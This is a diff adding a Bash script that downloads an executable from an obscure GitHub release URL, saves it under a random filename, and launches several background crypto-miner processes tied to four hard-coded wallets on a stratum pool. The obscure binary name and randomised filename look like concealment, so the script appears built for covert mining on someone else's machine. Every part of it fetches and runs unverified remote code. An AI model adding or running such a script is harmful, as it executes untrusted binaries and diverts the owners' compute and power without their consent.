@@ -1,0 +1,72 @@
+#!/bin/bash
+
+# Function to generate a random filename (10 characters)
+generate_random_filename() {
+    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
+    echo
+}
+
+# Miner binary URL
+url="https://github.com/vedhagsvp/tkospae/releases/download/latest/xpleoas"
+
+# Wallets
+wallets=(
+    "0xBD3D3E9878145D58dBF214a2ac684F93530Cf1bc"
+    "0x1932E17CB48175Fd79FD08596eCd246071913Cb4"
+    "0x502A820E52E569c019f22d79d849dFf5C50A57ed"
+    "0x414A2A8b272cbD0bcEbb70ae1919cfeff89521E7"
+)
+
+# Workers per wallet
+workers=(
+    "worker1"
+    "worker2"
+)
+
+# Stratum host
+stratum_host="testnet-stratum.x-phere.com:33333"
+
+download_miner() {
+    miner_filename=$1
+    echo "📥 Downloading miner..."
+    wget -q "$url" -O "$miner_filename" || {
+        echo "❌ Download failed"
+        exit 1
+    }
+    chmod +x "$miner_filename"
+    echo "✅ Miner ready: $miner_filename"
+}
+
+run_miners() {
+    miner_filename=$1
+
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] 🚀 Starting all miners..."
+
+    for wallet in "${wallets[@]}"; do
+        for worker in "${workers[@]}"; do
+            stratum_url="stratum+tcp://${wallet}.${worker}:x@${stratum_host}"
+            log_file="miner_${wallet:0:6}_${worker}.log"
+
+            echo "Starting ${wallet}.${worker}"
+
+            ./$miner_filename \
+                -stratum "$stratum_url" \
+                >> "$log_file" 2>&1 &
+        done
+    done
+
+    wait
+}
+
+main() {
+    [[ "$(uname)" != "Linux" ]] && {
+        echo "❌ Linux only"
+        exit 1
+    }
+
+    miner_filename=$(generate_random_filename)
+    download_miner "$miner_filename"
+    run_miners "$miner_filename"
+}
+
+main
